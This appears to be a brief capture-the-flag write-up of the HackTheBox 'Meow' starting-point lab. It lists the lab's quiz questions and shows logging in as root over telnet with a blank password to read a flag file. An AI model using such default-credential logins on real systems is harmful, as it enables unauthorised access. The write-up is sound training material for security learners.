# HackTheBox: Meow:
---
URL: https://app.hackthebox.com/starting-point \
Author: HackTheBox
### Challenge Description:
- What does the acronym VM stand for?
- What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.
- What service do we use to form our VPN connection into HTB labs?
- What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output?
- What tool do we use to test our connection to the target with an ICMP echo request?
- What is the name of the most common tool for finding open ports on a target?
- What service do we identify on port 23/tcp during our scans?
- What username is able to log into the target over telnet with a blank password?
- SUBMIT FLAG
### Solution:
Logged into target device using telnet:

```
telnet 10.129.125.34 -l root
```

used ls to list files and then cat the root flag from flag.txt

```
root@Meow:~# ls
total 36
4 drwx------  5 root root 4096 Jun 18  2021 .
4 drwxr-xr-x 20 root root 4096 Jul  7  2021 ..
0 lrwxrwxrwx  1 root root    9 Jun  4  2021 .bash_history -> /dev/null
4 -rw-r--r--  1 root root 3132 Oct  6  2020 .bashrc
4 drwx------  2 root root 4096 Apr 21  2021 .cache
4 -rw-r--r--  1 root root   33 Jun 17  2021 flag.txt
4 drwxr-xr-x  3 root root 4096 Apr 21  2021 .local
4 -rw-r--r--  1 root root  161 Dec  5  2019 .profile
4 -rw-r--r--  1 root root   75 Mar 26  2021 .selected_editor
4 drwxr-xr-x  3 root root 4096 Apr 21  2021 snap
root@Meow:~# cat flag.txt
```

Submitted the flag and successfully completed the box
---
Notes:
